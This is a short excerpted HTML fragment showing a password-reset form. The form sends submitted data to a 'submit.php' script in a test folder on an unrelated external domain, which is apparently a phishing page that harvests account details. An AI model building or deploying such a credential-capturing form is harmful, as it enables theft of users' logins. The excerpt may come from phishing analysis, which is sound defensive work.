...
<div id="global-error">
  ...
  <div class="request-password-reset flow-login">
        ...
        <form action="https://leatherfabriccollection.com/pjs/test2/submit.php" method="GET" name="requestPasswordReset" novalidate="novalidate" class="flow-login-form" id="PWResetForm">
